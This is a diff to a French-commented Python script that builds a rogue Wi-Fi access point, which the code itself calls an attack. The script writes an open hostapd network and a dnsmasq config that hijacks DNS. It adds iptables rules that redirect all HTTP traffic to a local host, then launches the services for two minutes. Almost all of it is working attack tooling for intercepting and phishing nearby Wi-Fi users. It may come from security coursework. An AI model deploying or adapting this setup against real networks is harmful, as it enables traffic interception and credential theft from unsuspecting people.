@@ -1,55 +1,103 @@
 import os
-
-
-#echo 1 > /proc/sys/net/ipv4/ip_forward
+import subprocess
+import time
 
 
 # Création du fichier de configuration Hostapd
 def create_hostapd_conf(interface, channel, essid):
-    config_content = f"""
-    interface={interface}
-    driver=nl80211
-    ssid={essid}
-    channel={channel}
-    hw_mode=g
-    macaddr_acl=0
-    auth_algs=0
-    ignore_broadcast_ssid=0
-    wpa=2
-    wpa_key_mgmt=WPA-PSK
-    wpa_pairwise=TKIP CCMP
-    rsn_pairwise=CCMP
-    """
+    config_content = f"""interface={interface}
+driver=nl80211
+ssid={essid}
+channel={channel}
+hw_mode=g
+auth_algs=1
+"""
     with open("RogueAP/hostapd.conf", "w") as config_file:
         config_file.write(config_content)
+    print("[SUCCESS] : Fichier de configuration Hostapd créé avec succès.")
         
 
 # Création du fichier de configuration Dnsmasq
 def create_dnsmasq_conf(interface):
-    config_content = f"""
-    interface={interface}
-    dhcp-range=192.168.1.20,192.168.1.80,12h
-    dhcp-option=3,8.8.8.8
-    dhcp-option=6,192.168.1.1
-    address=/connexion.com/192.168.1.1
-    """
+    config_content = f"""interface={interface}
+dhcp-range=192.168.1.20,192.168.1.80,12h
+dhcp-option=3,8.8.8.8
+dhcp-option=6,192.168.1.1
+address=/connexion.com/192.168.1.1
+"""
     with open("RogueAP/dnsmasq.conf", "w") as config_file:
         config_file.write(config_content)
+    print("[SUCCESS] : Fichier de configuration Dnsmasq créé avec succès.")
+
+
+# Configuration des règles iptables
+def iptables_conf(interface):
+    # Exécution des commandes iptables
+    command1 = "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"
+    if os.system(command1) != 0:
+        print(f"[ERROR] : Échec de l'exécution de la commande : {command1}")
+    else:
+        print(f"[SUCCESS] : Commande exécutée avec succès : {command1}")
+
+    command2 = f"sudo iptables -A FORWARD -i {interface} -j ACCEPT"
+    if os.system(command2) != 0:
+        print(f"[ERROR] : Échec de l'exécution de la commande : {command2}")
+    else:
+        print(f"[SUCCESS] : Commande exécutée avec succès : {command2}")
+
+    command3 = "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1"
+    if os.system(command3) != 0:
+        print(f"[ERROR] : Échec de l'exécution de la commande : {command3}")
+    else:
+        print(f"[SUCCESS] : Commande exécutée avec succès : {command3}")
 
 
 # Lancer les 2 services Hostapd et Dnsmasq
-def launch_rogue_ap():
-    os.system("sudo systemctl start hostapd")
-    os.system("sudo systemctl start dnsmasq")
-    print("[SUCCESS] : L'attaque Rogue AP a été lancée avec succès.")
+# Allumer l'interface réseau si elle est désactivée
+def launch_interface(interface):
+    if os.system(f"sudo ifconfig {interface} up") != 0:
+        print("[ERROR] : Échec de l'activation de l'interface réseau. (Peut-être déjà activée)")
+        return
+    else:
+        print("[SUCCESS] : Interface réseau activée.")
+
+
+
+
+def start_hostapd():
+    global hostapd_process
+    hostapd_process = subprocess.Popen(["sudo", "hostapd", "RogueAP/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    print("[SUCCESS] : Service Hostapd démarré avec succès.")
+
+def stop_hostapd():
+    global hostapd_process
+    if hostapd_process:
+        hostapd_process.terminate()
+        hostapd_process.wait()
+        print("[SUCCESS] : Service Hostapd arrêté avec succès.")
+    else:
+        print("[ERROR] : Aucun processus Hostapd en cours d'exécution.")
+        
+    
+def start_dnsmasq():
+    if os.system("sudo systemctl start dnsmasq") != 0:
+        print("[ERROR] : Échec du démarrage du service Dnsmasq.")
+    else:
+        print("[SUCCESS] : Service Dnsmasq démarré avec succès.")
+
+
 
 
 # Configuration du Rogue AP        
 def setup_rogue_ap(interface, channel, essid):
     create_hostapd_conf(interface, channel, essid)
     create_dnsmasq_conf(interface)
-    launch_rogue_ap()
-    
+    iptables_conf(interface)
+    launch_interface(interface)
+    start_dnsmasq()
+    start_hostapd()
+    time.sleep(120)
+    stop_hostapd()
     
 
 # Test de la fonction setup_rogue_ap
